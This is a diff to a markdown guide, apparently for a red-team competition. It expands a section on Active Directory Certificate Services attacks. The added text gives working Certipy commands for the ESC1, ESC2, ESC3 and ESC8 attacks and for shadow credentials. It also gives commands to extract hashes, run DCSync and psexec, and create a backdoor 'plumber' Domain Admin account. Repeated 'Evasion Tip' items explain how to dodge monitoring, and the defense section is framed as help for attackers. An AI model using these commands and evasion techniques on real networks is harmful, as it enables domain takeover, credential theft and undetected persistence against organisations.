@@ -352,10 +352,23 @@ Creating a user with Domain Admin rights is a high-value target for detection. T
 
 ## 7. Active Directory Certificate Services (AD CS) Attacks
 
-Active Directory Certificate Services (AD CS) is often an overlooked attack vector that can provide stealthy paths to domain dominance. These attacks target misconfigured certificate templates, enrollment services, and other AD CS components.
+Active Directory Certificate Services (AD CS) is often an overlooked attack vector that can provide stealthy paths to domain dominance. These attacks target misconfigured certificate templates, enrollment services, and other AD CS components. Unlike traditional AD attacks, certificate-based attacks often bypass common security monitoring and provide persistent access that survives password changes and other credential rotations.
+
+### Why AD CS Attacks Are Valuable
+
+1. **Low Detection Profile**: Many organizations heavily monitor Kerberos and NTLM authentication but pay less attention to certificate-based authentication.
+2. **Persistence**: Certificates can provide long-term access that survives password resets and account lockouts.
+3. **Privilege Escalation**: Misconfigured certificate templates can allow direct escalation to Domain Admin rights.
+4. **Alternative Attack Path**: When traditional methods are blocked or heavily monitored, AD CS often provides a viable alternative.
 
 - **Certipy for AD CS Enumeration**: Identify vulnerable certificate templates and AD CS misconfigurations.
   - **Tools**: `Certipy` (https://github.com/ly4k/Certipy)
+  - **How It Works**: Certipy queries the AD environment for certificate authorities, templates, and their configurations. It analyzes these configurations to identify security weaknesses such as dangerous template settings, vulnerable enrollment agent configurations, and misconfigured access controls.
+  - **What to Look For**:
+    - Templates with `Client Authentication` EKU
+    - Templates allowing `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (user-supplied subject)
+    - Templates with `PEND_ALL_REQUESTS` disabled (auto-enrollment)
+    - Templates with weak access controls
   - **Example (Enumerate AD CS Environment)**:
     ```bash
     # Find all certificate templates and their configurations
@@ -364,10 +377,15 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Analyze the output for vulnerable templates
     certipy find -vulnerable -stdout -json adcs_enum.json
     ```
-  - **Evasion Tip**: AD CS enumeration typically generates minimal alerts as it uses standard LDAP queries. Use authenticated sessions with valid credentials.
+  - **Evasion Tip**: AD CS enumeration typically generates minimal alerts as it uses standard LDAP queries. Use authenticated sessions with valid credentials. Perform enumeration during business hours when LDAP queries are common.
 
 - **ESC1 Attack (User/Machine Template Misconfiguration)**: Exploit templates that allow user authentication and have dangerous settings.
   - **Tools**: `Certipy`
+  - **Vulnerability Details**: ESC1 targets templates that:
+    1. Allow user-supplied subject names (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
+    2. Enable client authentication (EKU)
+    3. Allow low-privileged users to enroll
+  - **Attack Mechanics**: By requesting a certificate with a high-privileged user's UPN (User Principal Name) in the subject, you can authenticate as that user. The CA will issue the certificate because the template allows user-supplied subjects, and the certificate can then be used for authentication because it has the Client Authentication EKU.
   - **Example (ESC1 Exploitation)**:
     ```bash
     # Request a certificate using a vulnerable template
@@ -376,10 +394,15 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Use the certificate for authentication
     certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
     ```
-  - **Evasion Tip**: Certificate requests are legitimate operations and often generate minimal alerts. The authentication using the certificate is also less likely to trigger alerts than traditional credential-based authentication.
+  - **Evasion Tip**: Certificate requests are legitimate operations and often generate minimal alerts. The authentication using the certificate is also less likely to trigger alerts than traditional credential-based authentication. Perform certificate requests during business hours when legitimate certificate operations are common.
 
 - **ESC2 Attack (SAN Attribute Misconfiguration)**: Exploit templates that allow specifying Subject Alternative Name (SAN).
   - **Tools**: `Certipy`
+  - **Vulnerability Details**: ESC2 targets templates that:
+    1. Allow the SAN extension (`CTPRIVATEKEY_ATTRIBUTE_TEMPLATE.msPKI-Certificate-Name-Flag` includes `CTPRIVATEKEY_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS` or similar flags)
+    2. Enable client authentication (EKU)
+    3. Allow low-privileged users to enroll
+  - **Attack Mechanics**: The SAN field can contain alternative identities for the certificate holder. By specifying a high-privileged user's UPN in the SAN field, you can authenticate as that user. This is different from ESC1 because it uses the SAN field rather than the subject field.
   - **Example (ESC2 Exploitation)**:
     ```bash
     # Request a certificate with SAN specifying a domain admin
@@ -388,10 +411,14 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Use the certificate for authentication
     certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
     ```
-  - **Evasion Tip**: Carefully select the target account to minimize detection. Avoid targeting highly monitored accounts if possible.
+  - **Evasion Tip**: Carefully select the target account to minimize detection. Avoid targeting highly monitored accounts if possible. Consider targeting service accounts with domain admin privileges that might be less monitored than the actual Administrator account.
 
 - **ESC3 Attack (Enrollment Agent Template)**: Abuse enrollment agent templates to request certificates on behalf of other users.
   - **Tools**: `Certipy`
+  - **Vulnerability Details**: ESC3 targets the enrollment agent functionality, which allows designated users to request certificates on behalf of other users. This requires:
+    1. Access to a template with the Certificate Request Agent EKU
+    2. A vulnerable template that allows enrollment agents to request certificates
+  - **Attack Mechanics**: This is a two-step process. First, you obtain an enrollment agent certificate. Then, you use this certificate to request a certificate on behalf of a high-privileged user. This attack is particularly stealthy because it uses a legitimate AD CS feature.
   - **Example (ESC3 Exploitation)**:
     ```bash
     # Request an enrollment agent certificate
@@ -400,10 +427,15 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Use the enrollment agent certificate to request a certificate for another user
     certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <user_template> -on-behalf-of <domain>\administrator -pfx <enrollment_agent.pfx>
     ```
-  - **Evasion Tip**: This attack involves multiple steps, which can be spread out over time to avoid correlation alerts.
+  - **Evasion Tip**: This attack involves multiple steps, which can be spread out over time to avoid correlation alerts. The first certificate request (for the enrollment agent certificate) can be done days before the actual attack, making it harder to correlate with the subsequent privilege escalation.
 
 - **ESC8 Attack (NTLM Relay to AD CS Web Enrollment)**: Relay NTLM authentication to the Certificate Authority Web Enrollment service.
   - **Tools**: `Certipy`, `ntlmrelayx.py` (impacket)
+  - **Vulnerability Details**: ESC8 exploits the fact that:
+    1. The CA Web Enrollment service often doesn't require HTTPS
+    2. It accepts NTLM authentication
+    3. It doesn't enforce Extended Protection for Authentication (EPA)
+  - **Attack Mechanics**: By forcing a high-privileged user to authenticate to a machine you control, you can relay that authentication to the CA Web Enrollment service. The service will issue a certificate based on the relayed credentials, which you can then use to authenticate as the high-privileged user.
   - **Example (ESC8 Exploitation)**:
     ```bash
     # Start the relay server
@@ -412,10 +444,77 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Trigger NTLM authentication from a target
     certipy relay -ca <ca_server>
     ```
-  - **Evasion Tip**: NTLM relay attacks can be detected by network monitoring. Consider using this technique only if other methods are not available.
+  
+  - **Using the .pfx Certificate File**:
+    - **What is a .pfx file?**: After a successful relay, you'll obtain a .pfx (Personal Exchange Format) file, which contains:
+      1. The private key associated with the certificate
+      2. The certificate itself with the identity information of the relayed user
+      3. A password to protect the file (Certipy typically sets this to "password" by default)
+    
+    - **Authentication with the Certificate**:
+      ```bash
+      # Basic authentication with the certificate to get a TGT
+      certipy auth -pfx victim.pfx -dc-ip <dc_ip>
+      
+      # If the .pfx has a non-default password
+      certipy auth -pfx victim.pfx -password <pfx_password> -dc-ip <dc_ip>
+      
+      # Specify output file for the TGT
+      certipy auth -pfx victim.pfx -dc-ip <dc_ip> -out victim.ccache
+      ```
+    
+    - **Extracting NTLM Hash from Certificate**:
+      ```bash
+      # Extract the NT hash from the certificate
+      certipy cert -pfx victim.pfx -password <pfx_password> -export-hash
+      
+      # Use the hash with other tools
+      secretsdump.py -hashes :<NT_hash> <domain>/<username>@<dc_ip>
+      ```
+    
+    - **Accessing Resources with the Certificate**:
+      ```bash
+      # Set the Kerberos ticket for use
+      export KRB5CCNAME=victim.ccache  # Linux
+      set KRB5CCNAME=victim.ccache     # Windows CMD
+      $env:KRB5CCNAME="victim.ccache"  # PowerShell
+      
+      # Access SMB shares
+      smbclient.py -k <domain>/<username>@<server> -no-pass
+      
+      # Execute commands remotely
+      psexec.py -k <domain>/<username>@<server> -no-pass
+      
+      # WinRM access
+      evil-winrm -r <domain> -u <username> -i <server>
+      ```
+    
+    - **Creating the 'plumber' User with Certificate Authentication**:
+      ```bash
+      # If the relayed user has Domain Admin rights, create the plumber user
+      # First, get a PowerShell session using the certificate
+      psexec.py -k <domain>/<username>@<dc_ip> -no-pass
+      
+      # Then create the plumber user
+      New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
+      Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
+      
+      # Alternatively, use DCSync to extract credentials if the user has replication rights
+      secretsdump.py -k <domain>/<username>@<dc_ip>
+      ```
+    
+    - **Maintaining Persistence with the Certificate**:
+      - The .pfx file can be used for authentication until the certificate expires (typically 1 year by default)
+      - This persistence survives password changes for the compromised account
+      - Store the .pfx file securely for future access
+      - Consider requesting additional certificates for other accounts using the compromised account's privileges
+  
+  - **Evasion Tip**: NTLM relay attacks can be detected by network monitoring. Consider using this technique only if other methods are not available. If possible, perform the relay during periods of high network activity to blend in with legitimate traffic. Certificate-based authentication generates different event logs than password-based authentication, potentially evading detection rules focused on traditional authentication methods.
 
 - **Shadow Credentials with Certipy**: Alternative to the Whisker tool mentioned earlier.
   - **Tools**: `Certipy`
+  - **Vulnerability Details**: This attack exploits the Key Trust feature in modern Active Directory environments, which allows for certificate-based authentication via the `msDS-KeyCredentialLink` attribute.
+  - **Attack Mechanics**: If you have write access to a user or computer object's `msDS-KeyCredentialLink` attribute, you can add a "shadow credential" (a public key). This key can then be used to request a certificate for that account, effectively allowing you to authenticate as that account without knowing its password.
   - **Example (Shadow Credentials Attack)**:
     ```bash
     # Add shadow credentials to a target account
@@ -424,9 +523,15 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # Authenticate using the shadow credentials
     certipy auth -pfx <target_account>.pfx -dc-ip <dc_ip>
     ```
-  - **Evasion Tip**: This technique modifies the msDS-KeyCredentialLink attribute, which may be monitored but is less obvious than direct password changes.
+  - **Evasion Tip**: This technique modifies the msDS-KeyCredentialLink attribute, which may be monitored but is less obvious than direct password changes. The modification appears similar to legitimate device registration (like Windows Hello for Business), making it harder to distinguish from legitimate activity.
 
 - **Creating the 'plumber' User with Certificate-Based Authentication**:
+  - **Strategic Approach**: This comprehensive attack chain demonstrates how to use Certipy to achieve the competition's objective of creating the 'plumber' user with Domain Admin rights.
+  - **Attack Phases**:
+    1. **Reconnaissance**: Enumerate the AD CS environment to identify vulnerable templates
+    2. **Exploitation**: Use one of the ESC attacks to obtain Domain Admin privileges
+    3. **Objective Completion**: Create the 'plumber' user and add it to Domain Admins
+    4. **Persistence**: Optionally create a certificate for the 'plumber' user for long-term access
   - **Example (Complete Attack Chain)**:
     ```bash
     # 1. Enumerate AD CS
@@ -444,6 +549,23 @@ Active Directory Certificate Services (AD CS) is often an overlooked attack vect
     # 4. Optional: Create a certificate for the plumber user for persistent access
     certipy req -u administrator@<domain> -hashes <NTLM_hash> -dc-ip <dc_ip> -ca <ca_name> -template User -upn plumber@<domain>
     ```
-  - **Evasion Tip**: Certificate-based persistence is often less monitored than other persistence mechanisms. The certificate can be used for authentication even if the password is later changed.
+  - **Evasion Tip**: Certificate-based persistence is often less monitored than other persistence mechanisms. The certificate can be used for authentication even if the password is later changed. For maximum stealth, consider creating the 'plumber' user with attributes that match existing administrative users (similar description, department, etc.) as described in Section 6.
+
+### Advantages of Certipy Over Traditional AD Attack Methods
+
+1. **Bypasses Credential Protections**: Certificate-based authentication bypasses many credential protection mechanisms like Credential Guard.
+2. **Minimal Footprint**: Certipy operations generate fewer events in security logs compared to tools like Mimikatz.
+3. **Legitimate Functionality**: Exploits legitimate AD CS functionality rather than using memory manipulation or other suspicious techniques.
+4. **Persistent Access**: Certificates provide authentication capabilities that survive password changes and account lockouts.
+5. **Less Monitored**: Many organizations focus security monitoring on traditional attack vectors and overlook certificate-based attacks.
+
+### Defending Against Certipy Attacks
+
+While not directly relevant to the competition objective, understanding defense mechanisms can help attackers avoid detection:
+
+1. **Template Hardening**: Properly configured templates prevent ESC1/ESC2 attacks
+2. **Access Control**: Restricted enrollment rights prevent unauthorized certificate requests
+3. **Monitoring**: Certificate request monitoring can detect suspicious activities
+4. **HTTPS Enforcement**: Requiring HTTPS for the CA Web Enrollment service prevents ESC8 attacks
 
 Always consult the [Alert Evasion Cheatsheet](Alert-Evasion-Cheatsheet.md) and [Scoring System Cheatsheet](Scoring-System-Cheatsheet.md).
